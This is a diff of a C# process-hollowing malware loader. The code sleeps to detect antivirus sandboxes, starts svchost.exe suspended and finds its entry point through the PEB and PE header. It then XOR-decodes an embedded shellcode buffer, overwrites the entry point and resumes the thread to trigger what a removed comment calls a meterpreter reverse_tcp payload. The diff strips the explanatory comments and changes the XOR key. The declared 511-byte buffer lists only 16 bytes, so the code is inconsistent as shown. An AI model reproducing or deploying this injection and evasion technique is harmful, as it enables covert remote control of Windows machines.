@@ -75,7 +75,7 @@ namespace ProcessHollowing
 
         public static void Main(string[] args)
         {
-            // AV evasion: Sleep for 10s and detect if time really passed
+
             DateTime t1 = DateTime.Now;
             Sleep(10000);
             double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
@@ -84,37 +84,24 @@ namespace ProcessHollowing
                 return;
             }
 
-            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= EXITFUNC=thread -f csharp
-            // XORed with key 0xfa
             byte[] buf = new byte[511] {
             0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
             0x2f
             };
 
-            // Start 'svchost.exe' in a suspended state
             StartupInfo sInfo = new StartupInfo();
             ProcessInfo pInfo = new ProcessInfo();
             bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                 false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
             Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
 
-            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
             ProcessBasicInfo pbInfo = new ProcessBasicInfo();
             uint retLen = new uint();
             long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
             IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
             Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
 
-            // Get entry point of the actual process executable
-            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
-            // From the PEB (address we got in last call), we have to do the following:
-            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
-            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
-            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
-            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
-            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
 
-            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
             byte[] procAddr = new byte[0x8];
             byte[] dataBuf = new byte[0x200];
             IntPtr bytesRW = new IntPtr();
@@ -123,34 +110,30 @@ namespace ProcessHollowing
             result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
             Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");
 
-            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
             uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
             Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");
 
-            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
             uint rvaOffset = e_lfanew + 0x28;
             Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");
 
-            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
             uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
             Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");
 
-            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
+
             IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
             Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");
 
-            // Carrying on, decode the XOR payload
+            // decode
             for (int i = 0; i < buf.Length; i++)
             {
-                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+                buf[i] = (byte)((uint)buf[i] ^ 0x1b);
             }
             Console.WriteLine("XOR-decoded payload.");
 
-            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
+
             result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
             Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");
 
-            // Resume the thread to trigger our payload
             uint rResult = ResumeThread(pInfo.hThread);
             Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
         }
